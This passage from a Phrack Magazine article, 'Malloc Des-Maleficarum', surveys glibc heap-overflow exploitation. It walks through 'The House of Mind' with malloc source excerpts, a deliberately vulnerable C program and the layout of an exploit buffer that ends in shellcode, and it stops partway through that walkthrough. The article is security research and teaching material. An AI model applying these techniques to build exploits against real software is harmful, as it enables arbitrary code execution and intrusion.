<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
   <meta http-equiv="content-language" content="en" />
   <meta name="description" content="Phrack staff website." />
   <meta name="keywords" content="phrack" />
   <meta name="robots" content="follow,index,all" />

   <meta name="revisit-after" content="7 days" />
   
   <title>.:: Phrack Magazine ::.</title>
   
   <link href="../../css/style.css" rel="stylesheet" type="text/css">
</head>
<body id="top">
<div align="center" class="texto-2-bold">
[ <a href="../../index.html" title="News">News</a> ]
[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
[ <a href="../../authors.html" title="Authors">Authors</a> ]
[ <a href="../../archives/" title="Archives">Archives</a> ]
[ <a href="../../contact.html" title="Contact">Contact</a> ]

</div>

<center>
   <br>
   <br>
   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
   <br>

   <div class="texto-2">
   <div class="p-title">.:: Malloc Des-Maleficarum ::.</div>
   <hr width="600" />
   </div>
   
   <div style="padding-top: 4px; padding-bottom: 4px;">
<div class="around">

<div class="details"><strong>Issues</strong>: 
[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a class="current" href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
</div>
<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack66.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack66.tar.gz" title="Get current issue tar.gz">66</a> | <strong>Release date</strong> : <b>2009-11-06</b> | <strong>Editor</strong> : <b>The Circle of Lost Hackers</b></div>

<div style="border-top: 1px solid black; border-bottom: 2px solid black">
<table class="tissue" cellpadding="0" cellspacing="0">
   <tbody>
      <tr><td align="left"><a href="../../issues/66/1.html#article">Introduction</a></td><td align="right">TCLH</td></tr>
<tr><td align="left"><a href="../../issues/66/2.html#article">Phrack Prophile on The PaX Team</a></td><td align="right">TCLH</td></tr>
<tr><td align="left"><a href="../../issues/66/3.html#article">Phrack World News</a></td><td align="right">TCLH</td></tr>
<tr><td align="left"><a href="../../issues/66/4.html#article">Abusing the Objective C runtime</a></td><td align="right">nemo</td></tr>
<tr><td align="left"><a href="../../issues/66/5.html#article">Backdooring Juniper Firewalls</a></td><td align="right">Graeme</td></tr>
<tr><td align="left"><a href="../../issues/66/6.html#article">Exploiting DLmalloc frees in 2009</a></td><td align="right">huku</td></tr>
<tr><td align="left"><a href="../../issues/66/7.html#article">Persistent BIOS infection</a></td><td align="right">aLS and Alfredo</td></tr>
<tr><td align="left"><a href="../../issues/66/8.html#article">Exploiting UMA : FreeBSD kernel heap exploits</a></td><td align="right">argp and karl</td></tr>
<tr><td align="left"><a href="../../issues/66/9.html#article">Exploiting TCP Persist Timer Infiniteness</a></td><td align="right">ithilgore</td></tr>
<tr><td align="left"><a href="../../issues/66/10.html#article">Malloc Des-Maleficarum</a></td><td align="right">blackngel</td></tr>
<tr><td align="left"><a href="../../issues/66/11.html#article">A Real SMM Rootkit</a></td><td align="right">Core Collapse</td></tr>
<tr><td align="left"><a href="../../issues/66/12.html#article">Alphanumeric RISC ARM Shellcode</a></td><td align="right">YYounan and PPhilippaerts</td></tr>
<tr><td align="left"><a href="../../issues/66/13.html#article">Power cell buffer overflow</a></td><td align="right">BSDaemon</td></tr>
<tr><td align="left"><a href="../../issues/66/14.html#article">Binary Mangling with Radare</a></td><td align="right">pancake</td></tr>
<tr><td align="left"><a href="../../issues/66/15.html#article">Linux Kernel Heap Tampering Detection</a></td><td align="right">Larry H</td></tr>
<tr><td align="left"><a href="../../issues/66/16.html#article">Developing MacOS X Kernel Rootkits</a></td><td align="right">ghalen and wowie</td></tr>
<tr><td align="left"><a href="../../issues/66/17.html#article">How close are they of hacking your brain</a></td><td align="right">dahut</td></tr>

   </tbody>
</table>

<div class="opt" id="article"><strong>Title</strong> : Malloc Des-Maleficarum</div>
<div class="opt-bottom"> <strong>Author</strong> : blackngel</div>
<pre>				==Phrack Inc.==

		Volume 0x0d, Issue 0x42, Phile #0x0A of 0x11

|=-----------------------------------------------------------------------=|
|=----------------------=[ MALLOC DES-MALEFICARUM ]=---------------------=|
|=-----------------------------------------------------------------------=|
|=-----------------------------------------------------------------------=|
|=---------------=[    By blackngel                      ]=--------------=|
|=---------------=[                                      ]=--------------=|
|=---------------=[    &lt;black *noSPAM* set-ezine.org&gt;    ]=--------------=|
|=---------------=[    &lt;blackngel1 *noSPAM* gmail.org&gt;   ]=--------------=|
|=-----------------------------------------------------------------------=|


          ^^
      *`* @@ *`*     HACK THE WORLD
     *   *--*   *    
          ##         &lt;blackngel1@gmail.com&gt;
          ||         &lt;black@set-ezine.org&gt;
         *  *
        *    *       (C) Copyleft 2009 everybody
       _*    *_


---[ INDEX


 1 - The History

 2 - Introduction

 3 - Welcome to The Past

 4 - DES-Maleficarum...

   4.1 - The House of Mind
       4.1.1 - FastBin Method
       4.1.2 - av-&gt;top Nightmare

   4.2 - The House of Prime
       4.2.1 - unsorted_chunks()

   4.3 - The House of Spirit

   4.4 - The House of Force
       4.4.1 - Mistakes

   4.5 - The House of Lore

   4.6 - The House of Underground

 5 - ASLR and Nonexec Heap (The Future)

 6 - The House of Phrack

 7 - References


---[ END INDEX


          &quot;Traduitori son tratori&quot;


           -----------------
---[ 1 ---[   THE HISTORY   ]---
           -----------------

On August 11, 2001, two papers were released in that same magazine and
they went to demonstrate a new advance in the vulnerabilities exploitation
world.  MaXX wrote in his &quot;Vudo malloc tricks&quot; paper [1], the basic
implementation and algorithms of GNU C Library, Doug Lea's malloc(), and
he presented to the public various methods that be able to trigger
arbitrary code execution through heap overflows. At the same time, he
showed a real-life exploit of the &quot;Sudo&quot; application.

In the same number of Phrack, an anonymous person released other article,
titled &quot;Once upon a free()&quot; [2]. Its main goal was explain the System V
malloc implementation.

On August 13, 2003, &quot;jp &lt;jp@corest.com&gt;&quot; developed of a way more advanced
the skills initiated in the previous texts. His article, called &quot;Advanced
Doug Lea's malloc exploits&quot; [3], maybe out the biggest support to what it
was for coming...

The skills published in the first one of the articles, showed:

- unlink () method.
- frontlink () method.

... these methods were applicable until the year 2004, when the GLIBC
library was patched so those methods did not work. 

But not everything was said with regard to this topic. On October 11 of 
2005, Phantasmal Phantasmagoria was publishing on the &quot;bugtraq&quot; mailing
list an article which name provokes a deep mystery: &quot;Malloc Maleficarum&quot;
[4].

The name of the article was a variation of an ancient text 
 called &quot;Malleus Maleficarum&quot; (The Hammer of the Witches)...

Phantasmal also was the author of the fantastic article &quot;Exploiting the 
Wilderness&quot; [5], the chunk most afraid (at first) by the heap's lovers.

Malloc Maleficarum was a completely theoretical presentation of what could
become the new skills of exploitation with regard to topic of the heap
overflows. His author split each one of the skills titling them of the
following way:

   The House of Prime
   The House of Mind 
   The House of Force 
   The House of Lore 
   The House of Spirit 
   The House of Chaos (conclusion) 

And certainly, it was the revolution that open again the minds when the
doors had been closed.

The only one fault of this article is that it was not showing any
proof of concept that demonstrated that each and every one of the
skills were possible.

Probably, the implementations stayed in the &quot;background&quot;, or maybe in
closed circles.

On January 1, 2007, in the electronic magazine &quot;.aware EZine Alpha&quot;,
K-sPecial published an article simply called &quot;The House of Mind&quot; [6].
This one come to declaring in first instance the lacking small
fault of Phantasmal's article. 

On the other hand, he solved it presenting a proof of concept continued 
with its correspondent exploit.

Also, K-sPecial's paper was bringing to the light a couple of shades in 
which Phantasmal had missed in his interpretation of the Houses skills.

Finally, on May 25, 2007, g463 published in Phrack an article called:
&quot;The use of set_head to defeat the wilderness.&quot; [7] g463 described how to
obtain a &quot;write almost 4 arbitrary bytes to almost anywhere&quot; primitive
by exploiting an existing bug in the file (1) utility. This is the most
recent advance in heap overflows.



              &lt;&lt; En todas las actividades es saludable, de vez
                 en cuando, poner un signo de interrogacion
                 sobre aquellas cosas que por mucho tiempo se
                 han dado como seguras. &gt;&gt;

                                          [ Bertrand Russell ]



           ------------------
---[ 2 ---[   INTRODUCTION   ]---
           ------------------

We could to define this paper as &quot;The Practical Guide of the Malloc 
Maleficarum&quot;. And exactly, our main goal is demythologize the majority
of the methods described in this paper through practical examples (so
much the vulnerable programs as its associated exploits).

On the other hand, and very importantly, certain mistakes were trying to
be corrected that were an object of wrong interpretation in Malloc
Maleficarum. Mistakes that are today more easy to see thanks to the
enormous work that Phantasmal give us in his moment. He is an adept, a
&quot;virtual adept&quot; certainly...

It is due to these mistakes that in this article I present new
contributions to the world of the heap overflow under Linux, introducing
variations in the skills presented by Phantasmal, and totally new ideas
that could allow arbitrary code execution by a better way.

In short, you will see in this article:

 - Clean modification of K-sPecial's exploit in The House of Mind.
 - Implementation renewed of the &quot;fastbin&quot; method in The House of Mind.
 - Practical implementation of The House of Prime method.
 - New idea for direct arbitrary code execution in unsorted_chunks()
   method in The House of Prime.
 - The House of Spirit practical implementation.
 - The House of Force practical implementation.
 - Recapitulation of mistakes in The House of Force theory committed in
   Malloc Maleficarum.
 - Theoretical/practical approximation to The House of Lore.

In addition to a general understanding of the implementation of the &quot;Doug
Lea's malloc&quot; library, I recommend two things:

   1) Read first the article of MaxX [1].
   2) Download and read the source code of glibc-2.3.6 [8]
      (malloc.c and arena.c).

  NOTE: Except for The House of Prime, I had used a x86 Linux distro,
        on a 2.6.24-23 kernel, with glibc version 2.7, which shows
        that these techniques are still applicable today. Also, I have
        check that some of them are availables in 2.8.90.

NOTE 2: The current implementation of malloc is known as &quot;ptmalloc&quot;,
        which is an implementation based on the previous &quot;dlmalloc&quot;.
        Ptmalloc was created by Wolfram Gloger. At present, from glibc
        2.7 to 2.10 are Ptmalloc2 based. You can obtain more information
        if you visit [9].

As there, it would be desirable to have at your side the Phantasmal's
theory as support to subsequent methods that will be implemented. However,
the concepts described in this paper should be sufficient for an almost
complete understanding of the topic.

In this article you will see, through the witches, as there are still
some ways to go. And we can go together ...



                   &lt;&lt; Lo que conduce y arrastra
                      al mundo no son las maquinas,
                      sino las ideas. &gt;&gt;

                                    [ Victor Hugo ]



           ------------------------
---[ 3 ---[   WELCOME TO THE PAST  ]---
           ------------------------

Why does the &quot;unlink()&quot; technique not apply now?

&quot;unlink ()&quot; assumed that if two chunks were allocated in the heap, and
second was vulnerable to being overwritten through an overflow of first,
a third fake chunk could be created and so deceive &quot;free ()&quot; to proceed
to unlink this second chunk and tie with the first.

Unlink was produced with the following code:

   #define unlink( P, BK, FD ) {            \
       BK = P-&gt;bk;                          \
       FD = P-&gt;fd;                          \
       FD-&gt;bk = BK;                         \
       BK-&gt;fd = FD;                         \
   }

Being P the second chunk, &quot;P-&gt;fd&quot; was changed to point to a memory area
capable of being overwritten (such as .dtors - 12). If &quot;P-&gt;bk&quot; then
pointed to the address of a Shellcode located at memory for an exploiter
(at ENV or perhaps the same first chunk), then this address would be
written in the 3rd step of unlink() code, in &quot;FD-&gt;bk&quot;. Then:

   &quot;FD-&gt;bk&quot; = &quot;P-&gt;fd&quot; + 12 = &quot;.dtors&quot;.
   &quot;.dtors&quot; -&gt; &amp;(Shellcode)

In fact, when using DTORS, &quot;P-&gt;fd&quot; should point to .dtors+4-12 so that
&quot;FD-&gt;bk&quot; point to DTORS_END, to be executed at finish of application. GOT
is also a good goal, or a function pointer or more things ...

And here started the fun!

By applying the appropriate patches glibc, the macro &quot;unlink()&quot; is shown
as follows:

   #define unlink(P, BK, FD) {                                            \
     FD = P-&gt;fd;                                                          \
     BK = P-&gt;bk;                                                          \
     if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                \
       malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P); \
     else {                                                               \
       FD-&gt;bk = BK;                                                       \
       BK-&gt;fd = FD;                                                       \
     }                                                                    \
   }

If &quot;P-&gt;fd&quot;, pointing to the next chunk (FD), is not modified, then the
&quot;bk&quot; pointer of FD should point to P. The same is true with the previous
chunk (BK)... if &quot;P-&gt;bk&quot; points to the previous chunk, then the forward
pointer at BK should point to P. In any other case, mean an error in the
double linked list and thus the second chunk (P) has been hacked.

And here ended the fun!



                  &lt;&lt; Nuestra tecnica no solo produce artefactos,
                     esto es, cosas que la naturaleza no produce,
                     sino tambien las cosas mismas que la naturaleza
                     produce y dotadas de identica actividad
                     natural. &gt;&gt;

                                                   [ Xavier Zubiri ]



           ------------------------
---[ 4 ---[   DES-MALEFICARUM...   ]---
           ------------------------

Read carefully what now comes. I just hope that at the end of this paper,
the witches have completely disappeared.

Or... would it be better that they stay?



             -----------------------
---[ 4.1 ---[   THE HOUSE OF MIND   ]---
             -----------------------

We will study &quot;The House of Mind&quot; technique here, step by step, so that
those who start at these boundaries do not find too many problems along
the path... a path that already may be a little hard.

Neither show is worth a second view / opinion about how develop the
exploit, which in my case had a small behavioral variation (we will see it
below).

The understanding of this technique will become much easier if for some
accident I can demonstrate the ability of know to show the steps in
certain order, otherwise the mind go from one side to another, but... test
and play with the technique.

&quot;The House of Mind&quot; is described as perhaps the easiest method or, at
least, more friendly with respect to what was &quot;unlink()&quot; in its moment of
glory.

Two variants will be shown. Let's see here the first one:

NOTE 1: Only one call to &quot;free()&quot; is needed to provoke arbitrary code
        execution.

NOTE 2: From here, we will have always in mind that &quot;free()&quot; is executed
        on a second chunk that can be overflowed by another chunk that
        has been allocated before.

According to &quot;malloc.c,&quot; a call to &quot;free()&quot; triggers the execution of a
wrapper (in the jargon &quot;wrapper functions&quot;) called &quot;public_fREe()&quot;.

Here the relevant code:

   void
   public_fREe(Void_t* mem)
   {
       mstate ar_ptr;
       mchunkptr p;        /* chunk corresponding to mem */
       ...
       p = mem2chunk(mem);
       ...
       ar_ptr = arena_for_chunk(p);
       ...
       _int_free(ar_ptr, mem);
   }


A call to &quot;malloc (x)&quot; returns, always that there is still memory
available, a pointer to the memory area where data can be stored, moved,
copied, etc.

Imagine for example that:

   &quot;char * ptr = (char *) malloc (512);&quot;

...returns the address &quot;0x0804a008&quot;. This address is the &quot;mem&quot; content
when  &quot;free()&quot; is called.

The &quot;mem2chunk(mem)&quot; function returns a pointer to the start address of
chunk (not the data, but the beginning of the chunk), which in a allocated
chunk is set to something like:

   &amp;mem - sizeof(size) - sizeof(prev_size) = &amp;mem - 8.

   p = (0x0804a000);

&quot;p&quot; is send to &quot;arena_for_chunk()&quot;. As we can read in &quot;arena.c&quot;, it
trigger the following code:


   #define HEAP_MAX_SIZE (1024*1024) /* must be a power of two */
                    _____________________________________________
                   |                                             |
   #define heap_for_ptr(ptr) \                                   |
      ((heap_info *)((unsigned long)(ptr) &amp; ~(HEAP_MAX_SIZE-1))) |
                                                                 |
   #define chunk_non_main_arena(p) ((p)-&gt;size &amp; NON_MAIN_ARENA)  |
  __________________|                         ___________________|
 |                                           |
 | #define arena_for_chunk(ptr) \            |
 |___(chunk_non_main_arena(ptr)?heap_for_ptr(ptr)-&gt;ar_ptr:&amp;main_arena)


As we see, &quot;p&quot; is now &quot;ptr&quot;. It is passed &quot;chunk_non_main_arena()&quot;
which is responsible for checking whether the &quot;size&quot; of this chunk has
its third least significant bit enabled (NON_MAIN_ARENA = 4h = 100b).

In a unmodified chunk, this function returns &quot;false&quot; and the address of
&quot;main_arena&quot; will be returned by &quot;arena_for_chunk()&quot;. But... fortunately,
since we can corrupt the &quot;size&quot; field of &quot;p&quot;, and enabled NON_MAIN_ARENA
bit, then we can fool &quot;arena_for_chunk()&quot; to call to &quot;heap_for_ptr().

We are now in:

   (heap_info *) ((unsigned long)(0x0804a000) &amp; ~(HEAP_MAX_SIZE-1)))
   
   then:

   (heap_info *) (0x08000000)

We must have in mind that &quot;heap_for_ptr()&quot; is a macro and not a function.
Then, once more in &quot;arena_for_chunk()&quot; we have:

   (0x08000000)-&gt;ar_ptr

&quot;ar_ptr&quot; is the first member of a &quot;heap_info&quot; structure. It is defined
as you can see:

   typedef struct _heap_info {
     mstate ar_ptr; /* Arena for this heap. */
     struct _heap_info *prev; /* Previous heap. */
     size_t size;   /* Current size in bytes. */
     size_t pad;    /* Make sure the following data is properly aligned. */
   } heap_info;

	
So what you are looking at (0x08000000) the address of an &quot;arena&quot; (it will
be defined shortly). For now, we can say that at (0x08000000) there isn't
any address to point to any &quot;arena&quot;, so the application soon will break
with a segmentation fault. (assuming an ET_EXEC with a base of 0x08048000)

It seems that our move end here. As our first chunk is just behind of the
second chunk at (0x0804a000) (but not much), this only allows us to
overwrite forward, preventing us write anything at (0x08000000).

But wait a moment... what happens if we can overwrite a chunk with an
address like this: (0x081002a0)?

If our first chunk was at (0x0804a000), we can overwrite ahead and put in
(0x08100000) an arbitrary address (usually the begining of the data of our
first chunk).

Then &quot;heap_for_ptr(ptr)-&gt;ar_ptr&quot; take this address, and...


 return heap_for_ptr(ptr)-&gt;ar_ptr | ret (0x08100000)-&gt;ar_ptr = 0x0804a008
 -------------------------------- | --------------------------------------
 ar_ptr = arena_for_chunk(p);     | ar_ptr = 0x0804a008
 ...                              |
 _int_free(ar_ptr, mem);          | _int_free(0x0804a008, 0x081002a0);


Think that we can change &quot;ar_ptr&quot; to any value. For example, we can do
that it points to an environment variable or another place. At this
address of memory, &quot;_int_free()&quot; expects to find an &quot;arena&quot; structure.

Let's see now ...

    mstate ar_ptr;

&quot;mstate&quot; is actually a real &quot;malloc_state&quot; structure (no comments):

   struct malloc_state {
     mutex_t mutex;
     INTERNAL_SIZE_T  max_fast;   /* low 2 bits used as flags */
     mfastbinptr      fastbins[NFASTBINS];
     mchunkptr        top;
     mchunkptr        last_remainder;
     mchunkptr        bins[NBINS * 2];
     unsigned int     binmap[BINMAPSIZE];
     ...
     INTERNAL_SIZE_T system_mem;
     INTERNAL_SIZE_T max_system_mem;
   };
   ...
   static struct malloc_state main_arena;

Soon it will be helpful to know this. The goal of The House of Mind is to
ensure that the unsorted_chunks() code is reaached in &quot;_int_free ()&quot;:

   void _int_free(mstate av, Void_t* mem) {
      .....
      bck = unsorted_chunks(av);
      fwd = bck-&gt;fd;
      p-&gt;bk = bck;
      p-&gt;fd = fwd;
      bck-&gt;fd = p;
      fwd-&gt;bk = p;
      .....
   }

This is already beginning to look a bit more to &quot;unlink()&quot;.

Now &quot;av&quot; is the value of &quot;ar_ptr&quot; which is supposed to be the beginning
of an &quot;arena&quot;. More... &quot;unsorted_chunks (),&quot; according to Phantasmal
Phantasmagoria, return the value of &quot;av-&gt;bins[0]&quot;. If &quot;av&quot; is (0x0804a008)
(the start of our buffer), and we can write forward, we can control the
value of bins[0], once past fields: mutex, max_fast, fastbins[] and top.
This is simple ...

Phantasmal showed us that if we put in av-&gt;bins[0] the address of &quot;.dtors&quot;
minus 8, then, the penultimate sentence write in this  address plus 8, the
address of the overflow &quot;p&quot;. In this address is the &quot;prev_size&quot; field and
there can place any thing, such as a &quot;JMP&quot;, then we can jump to shellcode
located a little later and you know as follows ...

   p = 0x081002a0 - 8;
   ...
   bck = .dtors + 4 - 8
   ...
   bck + 8 = DTORS_END = 0x08100298

   1st Bit     -bins[0]-                     2nd Bit
   [ .......... .dtors+4-8 ] [0x0804a008 ... ] [jmp 0xc ...... (Shellcode)] 
   |                         |                 |
   0x0804a008                0x08100000        0x08100298

When application finishes running DTORS, therefore the jump is executed,
and our Shellcode.

Although the idea was good, K-special warned us that &quot;unsorted_chunks ()&quot;,
in fact, did not return the value of &quot;av-&gt;bins[0],&quot; but it returns its
address &quot;&amp;&quot;.

Let's take a look:

   #define bin_at(m, i) ((mbinptr)((char*)&amp;((m)-&gt;bins[(i)&lt;&lt;1]) - 
                                                (SIZE_SZ&lt;&lt;1)))
   ...
   #define unsorted_chunks(M)          (bin_at(M, 1))

Indeed, we see that &quot;bin_at()&quot; returns the address and not the value.
Therefore another way must be taken. Bearing this in mind, we can do
the next:

   bck = &amp;av-&gt;bins[0];                     /* Address of ...   */
   fwd = bck-&gt;fd = *(&amp;av-&gt;bins[0] + 8);    /* The value of ... */
   fwd-&gt;bk = *(&amp;av-&gt;bins[0] + 8) + 12 = p;

	
Which means that if we control the value located in:
&quot;&amp;av-&gt;bins[0] + 8&quot; and we put there &quot;.dtors + 4 - 12&quot;, that will be
placed in &quot;fwd&quot;. In the last sentence it'll be written into DTORS_END
the address of the second chunk &quot;p&quot;, and continue as above.

But we have jumped here without crossing the road full of spines. Our
friend Phantasmal also warned us that to run this piece of code, certain
conditions should be met. Now we will see each of them related with its
corresponding portion of code in the &quot;_int_free()&quot;.

   1) The negative value of the overwritten chunk must
      be less than the value of this chunk &quot;p&quot;.

      if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0) ...

      PLEASE NOTE: This must be a misinterpretation of language. To jump
                   this integrity check: &quot;-size&quot; must be &quot;greater&quot; than
                   the value of &quot;p&quot;.

   2) The size of the chunk must not be less than or equal to
      av-&gt;max_fast.

      if ((unsigned long)(size) &lt;= (unsigned long)(av-&gt;max_fast) ...

      We control the size of the overflow chunk so as &quot;av-&gt;max_fast&quot;
      which is the second field of our &quot;fakearena&quot;.

   3) The bit IS_MMAPPED must not be set into the &quot;size&quot; field.

      else if (!chunk_is_mmapped(p)) { ...

      Also, we control the second least significant bit of the &quot;size&quot;.

   4) The overwrited chunk can not be av-&gt;top (Wilderness chunk).

      if (__builtin_expect (p == av-&gt;top, 0)) ...

   5) The NONCONTIGUOUS_BIT of av-&gt;max_fast must be set.

      if (__builtin_expect (contiguous (av) ...

   Designer controls &quot;av-&gt;max_fast&quot; and know that NONCONTIGUOUS_BIT
   is &quot;0x02&quot; = &quot;10b&quot;.

   6) The PREV_INUSE bit of the next chunk must be set.

      if (__builtin_expect (!prev_inuse(nextchunk), 0)) ...

      This is the default in an allocated chunk.

   7) The size of nextchunk must be greater than 8.

      if (__builtin_expect (nextchunk-&gt;size &lt;= 2 * SIZE_SZ, 0) ...

   8) The size of nextchunk must be less than av-&gt;system_mem

      ... __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0)) ...

   9) The PREV_INUSE bit of the chunk must not be set.

      /* consolidate backward */
      if (!prev_inuse(p)) { ...

      ATTENTION: Phantasmal seems wrong here, at least according to my
                 opinion, the PREV_INUSE bit of overwritten chunk, must
                 be set in order to bypass this check and not unlink the
                 previous chunk.

  10) The nextchunk cannot equal av-&gt;top.

      if (nextchunk != av-&gt;top) { ...

      If we alter all the information from &quot;av-&gt;fastbins[]&quot; to
      &quot;av-&gt;bins[0]&quot;, then &quot;av-&gt;top&quot; will be overwritten and will
      be almost impossible to be equal to &quot;nextchunk&quot;.

  11) The PREV_INUSE bit of the chunk after nextchunk
      (nextchunk + nextsize) must be set.

      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
      /* consolidate forward */
      if (!nextinuse) { ...

The path seems long and tortuous, but it is not so much when we control
most situations. Let's go to see the vulnerable program of our friend
K-sPecial:

[-----]

/*
 * K-sPecial's vulnerable program
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main (void) {
   char *ptr  = malloc(1024);        /* First allocated chunk */
   char *ptr2;                       /* Second chunk          */
   /* ptr &amp; ~(HEAP_MAX_SIZE-1) = 0x08000000 */
   int heap = (int)ptr &amp; 0xFFF00000;
   _Bool found = 0;

   printf(&quot;ptr found at %p\n&quot;, ptr);  /* Print address of first chunk */

   // i == 2 because this is my second chunk to allocate
   for (int i = 2; i &lt; 1024; i++) {
     /* Allocate chunks up to 0x08100000 */
     if (!found &amp;&amp; (((int)(ptr2 = malloc(1024)) &amp; 0xFFF00000) == \
                                           (heap + 0x100000))) {
       printf(&quot;good heap allignment found on malloc() %i (%p)\n&quot;, i, ptr2);
          found = 1; /* Go out */
          break;
       }

   }
        malloc(1024); /* Request another chunk: (ptr2 != av-&gt;top) */
        /* Incorrect input: 1048576 bytes */
        fread (ptr, 1024 * 1024, 1, stdin); 

        free(ptr);   /* Free first chunk  */
        free(ptr2);  /* The House of Mind */
        return(0);   /* Bye */
}

[-----]

Note that the input allows NULL bytes without ending our string. This
makes our task more easy.

The K-sPecial's exploit create the following string:

[-----]

 0x0804a008
 |
 [Ax8][0h x 4][201h x 8][DTORS_END-12 x 246][(409h-Ax1028) x 721][409h] ...
              |                   |
              av-&gt;max_fast        bins[0]      size
                                               |
 .... [(&amp;1st chunk + 8) x 256][NOPx2-JUMP 0x0c][40Dh][NOPx8][SHELLCODE]
              |               |                      |
              0x08100000      prev_size (0x08100298) *mem (0x081002a0)

[-----]

1)  The first call to free() overwrites the first 8 bytes with garbage,
    then K-special prefer to skip this area and put into (0x08100000)
    the address of the first chunk + 8(data area) + 8 (0x0804a010).
    Here begins the fake arena structure.

2)  Then comes &quot;\x00\x00\x00\x00&quot; that fills the &quot;av-&gt;mutex&quot; field.
    Other value will cause that the exploit to fail.

3)  &quot;av-&gt;max_fast&quot; get the value &quot;102h&quot;. This satisfies the conditions
    2 and 5:

    (2) (size &gt; max_fast) -&gt; (40Dh &gt; 102h)
    (5) &quot;\x02&quot; NONCONTIGUOUS_BIT is set

4)  Complete the first chunk with the DTORS_END (.dtors+4) address
    minus 8. This will overwrite &amp;av-&gt;bins[0] + 8.

5)  Fill the nexts chunks until (0x08100000) with characters &quot;A&quot;, while
    retaining the &quot;size&quot; field (409h) of each chunk. Each one has
    PREV_INUSE bit properly set.

6)  To reach the address of the overwritten chunk &quot;p&quot;, we fill with
